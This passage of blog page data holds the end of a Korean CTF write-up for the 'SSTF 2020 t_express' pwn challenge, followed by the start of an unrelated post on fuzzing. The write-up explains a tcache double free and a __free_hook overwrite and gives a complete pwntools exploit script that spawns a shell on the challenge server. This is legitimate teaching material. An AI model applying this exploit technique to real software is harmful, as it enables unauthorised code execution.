aria-label=\"__free_hook overwrite permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>__free_hook Overwrite</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">Buy<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span>\nBuy<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span>\nBuy<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>lib_system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>C 라이브러리에는 malloc, calloc, free와 같은 함수들을 관리하기 위해 <code class=\"language-text\">__malloc_hook</code>, <code class=\"language-text\">__free_hook</code> 변수를 제공한다. 해당 변수에 후킹 함수의 주소가 저장되어 있으며 해당 함수가 호출될 때 기존의 함수가 아닌 후킹 함수가 호출된다.</li>\n<li>__free_hook의 주소를 Overwrite하기 위해 같은 크기로 할당을 한후  <code class=\"language-text\">FD</code> 의 값을 <code class=\"language-text\">__free_hook</code> 주소로 변경하게 되면 남은 tcache의 FD 값도 해당 __free_hook을 가리키게 된다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABTElEQVQoz33Q2W7bMBAFUH2HLZOUOaREiovETYs3OY6dVkZRBAiCAP3//yiU9iVoUuA8zAD3PsxkQ9yn8ebSLgyJgMVgtAtxGDA1GKxSdtc3BCzaau1CpRymhsu2CUs4m+cfD9d7bX0a9zlhKwImdOPpvCKAgEthW5uoVMqF0+Otid2aUF7rw/mCocyO+/p4H7unIRycdsoG4Xvpe6FaiWiFQGxAEiYKLjEIDNWCVhu6DNnG1PnRr2+xiOeibArGC14VvCKs+ht9h+iH9Y8M6Xoz+vySsJswsxj4v6GvZMjU+RRX3yMKJ7w8hudbgegCgyBM/K+MS1WYWPpxax6Z7ZhutCt5zbVjtIQ1Ye+nfi4zik8pzumwv0xySKUfZIpMad83ceybkDAAop/LUrj3D6/X+f7t56z8te1futOvcXpLu2fV3HT7BNXhK78B7KZbqSI4yjsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./25.png\"\n        title=\"./25.png\"\n        src=\"/static/e2977ce1ca466639d8412a31dfefc7f3/37523/25.png\"\n        srcset=\"/static/e2977ce1ca466639d8412a31dfefc7f3/e9ff0/25.png 180w,\n/static/e2977ce1ca466639d8412a31dfefc7f3/f21e7/25.png 360w,\n/static/e2977ce1ca466639d8412a31dfefc7f3/37523/25.png 720w,\n/static/e2977ce1ca466639d8412a31dfefc7f3/90712/25.png 882w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>tcache dup</p>\n<ul>\n<li>다음 tcache에는 “/bin/sh\\x00” 문자열을 집어 넣어할당한다. 나중에 __free_hook 주소를 system 주소로 변경하여 free를 호출할 때 system 함수가 호출되면서 해당 힙 청크를 인자로 사용하기 위해서이다.<code class=\"language-text\">system(/bin/sh\\x00)</code></li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 648px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA10lEQVQY04XL226DIACAYR+kngAFtZSiIigiBU+xabqLJXv/R9nFbreZ/PnvvgARzTuvzPMufMXGNKtB3pzVJtm1pF8BwJy1nfHrJYERzGKEY5SfRUIY4eoVJBlrlDZ+J5TDgkYQx4icVYYwxdU7IGwc3DJM/taqu+hRQdO8TLLi5yeYyW2ws99f3WD7aaZ1d2tlyZorFwBXIcijf3AjvNuex8entnM/zXY59GOd/C61pbxDBQW4+hPv81v7VRknhkmOD2Wc8dvoVrsco1tqqWupQV5Gv+FvBNtJjOOS6iMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./26.png\"\n        title=\"./26.png\"\n        src=\"/static/9ea95ed24e3c7dfb20db5ce68a339122/3996e/26.png\"\n        srcset=\"/static/9ea95ed24e3c7dfb20db5ce68a339122/e9ff0/26.png 180w,\n/static/9ea95ed24e3c7dfb20db5ce68a339122/f21e7/26.png 360w,\n/static/9ea95ed24e3c7dfb20db5ce68a339122/3996e/26.png 648w\"\n        sizes=\"(max-width: 648px) 100vw, 648px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>flag</p>\n<ul>\n<li>flag를 획득할 수 있다.</li>\n</ul>\n<h2 id=\"공격-코드\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C\" aria-label=\"공격 코드 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 코드</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ne <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./t_express'</span><span class=\"token punctuation\">)</span>\nl <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># p = process('./t_express')</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'ctf.campus.theori.io'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7079</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">Buy</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span> first<span class=\"token punctuation\">,</span> last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"(1/2): \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"First name: \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Last name: \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">View</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index of ticket: \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># leak (lib_base)</span>\n    <span class=\"token keyword\">if</span> idx <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"|name |\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        lib_base <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">9</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n                       <span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x83</span> <span class=\"token operator\">-</span> l<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"lib_base : \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>lib_base<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> lib_base\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"==========================\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"==========================\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">Use</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index of ticket: \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"(1/2/3/4): \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">_free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        Use<span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    Use<span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    Use<span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\nlib_base <span class=\"token operator\">=</span> View<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\nBuy<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBBBBBB\"</span><span class=\"token punctuation\">)</span>\nBuy<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span>\n\n_free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    Use<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    Use<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\nlib_system <span class=\"token operator\">=</span> lib_base <span class=\"token operator\">+</span> l<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\nfree_hook <span class=\"token operator\">=</span> lib_base <span class=\"token operator\">+</span> l<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\n\nlog<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>lib_system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlog<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nBuy<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span>\nBuy<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span>\nBuy<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>lib_system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span>\n\n_free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\">바이너리 개요</a></p>\n<ul>\n<li><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\">보호기법</a></li>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%A0%95%EB%B3%B4\">바이너리 정보</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\">바이너리 분석</a></p>\n<ul>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%A1%9C%EC%A7%81-%ED%9D%90%EB%A6%84\">바이너리 로직 흐름</a></li>\n<li><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main 함수 분석</a></li>\n<li><a href=\"#buy_ticket-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">buy_ticket 함수 분석</a></li>\n<li><a href=\"#read_str-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D-off-by-one-%EC%B7%A8%EC%95%BD%EC%A0%90\">read_str 함수 분석 (off-by-one 취약점)</a></li>\n<li><a href=\"#view_ticket-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D-out-of-bound-integer-issues\">View_ticket 함수 분석 (out-of-bound, integer issues)</a></li>\n<li><a href=\"#use_ticket-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D-double-free\">Use_ticket 함수 분석 (Double Free)</a></li>\n<li><a href=\"#heap-%EB%A9%94%EB%AA%A8%EB%A6%AC-%ED%95%B4%EC%A0%9C-%EA%B3%BC%EC%A0%95\">heap 메모리 해제 과정</a></li>\n<li><a href=\"#%ED%95%B4%EC%A0%9C\">해제</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9\">공격</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">공격 시나리오</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%9D%B8%ED%84%B0%ED%8E%98%EC%9D%B4%EC%8A%A4\">인터페이스</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%EC%A3%BC%EC%86%8C-%EB%85%B8%EC%B6%9C\">라이브러리 주소 노출</a></p>\n</li>\n<li>\n<p><a href=\"#off-by-one%EC%9D%84-%EB%B0%94%ED%83%95%EC%9C%BC%EB%A1%9C-ticket_type-0%EC%9C%BC%EB%A1%9C-%EB%B3%80%EA%B2%BD\">off-by-one을 바탕으로 ticket_type 0으로 변경</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%B2%AB-%EB%B2%88%EC%A7%B8-%ED%95%B4%EC%A0%9C%ED%9B%84-%ED%82%A4%EA%B0%92-%ED%99%95%EC%9D%B8\">첫 번째 해제후 키값 확인</a></p>\n</li>\n<li>\n<p><a href=\"#%ED%82%A4-%EB%B3%80%EC%A1%B0%ED%9B%84-doube-free-%EB%B2%84%EA%B7%B8-%EB%B0%9C%EC%83%9D\">키 변조후 Doube Free 버그 발생</a></p>\n</li>\n<li>\n<p><a href=\"#__free_hook-overwrite\">__free_hook Overwrite</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C\">공격 코드</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"September 18, 2020","title":"SSTF 2020 t_express","categories":"CTF","author":"Zer0Luck","emoji":"🥛"},"fields":{"slug":"/sstf2020_t_express_ctf_writeup/"}},"prev":{"id":"b1774849-da4b-5855-9b5c-547e7a977783","html":"<h1 id=\"fuzz\" style=\"position:relative;\"><a href=\"#fuzz\" aria-label=\"fuzz permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fuzz</h1>\n<p><strong>Fuzzing</strong> or <strong>fuzz testing</strong> is an automated <a href=\"https://en.wikipedia.org/wiki/Software_testing\">software testing</a> technique that involves providing invalid, unexpected, or <a href=\"https://en.wikipedia.org/wiki/Random_data\">random data</a> as inputs to a <a href=\"https://en.wikipedia.org/wiki/Computer_program\">computer program</a>. The program is then monitored for exceptions such as <a href=\"https://en.wikipedia.org/wiki/Crash_(computing)\">crashes</a>, failing built-in code <a href=\"https://en.wikipedia.org/wiki/Assertion_(software_development)\">assertions</a>, or potential <a href=\"https://en.wikipedia.org/wiki/Memory_leak\">memory leaks</a>. Typically, fuzzers are used to test programs that take structured inputs. This structure is specified, e.g., in a <a href=\"https://en.wikipedia.org/wiki/File_format\">file format</a> or <a href=\"https://en.wikipedia.org/wiki/Communications_protocol\">protocol</a> and distinguishes valid from invalid input. An effective fuzzer generates semi-valid inputs that are “valid enough” in that they are not directly rejected by the parser, but do create unexpected behaviors deeper in the program and are “invalid enough” to expose <a href=\"https://en.wikipedia.org/wiki/Corner_case\">corner cases</a> that have not been properly dealt with.</p>\n<p>For the purpose of security, input that crosses a <a href=\"https://en.wikipedia.org/wiki/Trust_boundary\">trust boundary</a> is often the most interesting. For example, it is more important to fuzz code that handles the upload of a file by any user than it is to fuzz the code that parses a configuration file that is accessible only to a privileged user.</p>\n<p><a href=\"https://en.wikipedia.org/wiki/Fuzzing\"><em>https://en.wikipedia.org/wiki/Fuzzing</em></a></p>\n<h2 id=\"fuzzer-tool\" style=\"position:relative;\"><a href=\"#fuzzer-tool\" aria-label=\"fuzzer tool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fuzzer tool</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token number\">1.</span> Window PE <span class=\"token builtin\">file</span> fuzzing operation\n<span class=\"token number\">2.</span> dumb fuzzer\n<span class=\"token number\">3.</span> Customizable TestCase\n<span class=\"token number\">4.</span> GUI Interface using PyQt\n<span class=\"token number\">5.</span> Message Box notification when Crash <span class=\"token keyword\">is</span> detected</code></pre></div>\n<h2 id=\"required-installation\" style=\"position:relative;\"><a href=\"#required-installation\" aria-label=\"required installation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Required installation</h2>\n<ul>\n<li><a href=\"https://vallhalla-edition.tistory.com/attachment/cfile23.uf@9959693E5C98A9A80FBC86.exe\">PaiMei-1.1.win32.exe</a></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\">######################################################################</span>\n<span class=\"token comment\">#  This file should be kept compatible with Python 2.3, see PEP 291. #</span>\n<span class=\"token comment\">######################################################################</span>\n<span class=\"token triple-quoted-string string\">\"\"\"create and manipulate C data types in Python\"\"\"</span>\n\n<span class=\"token keyword\">import</span> os <span class=\"token keyword\">as</span> _os<span class=\"token punctuation\">,</span> sys <span class=\"token keyword\">as</span> _sys\n\n__version__ <span class=\"token operator\">=</span> <span class=\"token string\">\"1.1.0\"</span>\n\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> Union<span class=\"token punctuation\">,</span> Structure<span class=\"token punctuation\">,</span> Array\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> _Pointer\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> CFuncPtr <span class=\"token keyword\">as</span> _CFuncPtr\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> __version__ <span class=\"token keyword\">as</span> _ctypes_version\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> RTLD_LOCAL<span class=\"token punctuation\">,</span> RTLD_GLOBAL\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> ArgumentError\n\n<span class=\"token keyword\">from</span> _ctypes <span class=\"token keyword\">import</span> Structure <span 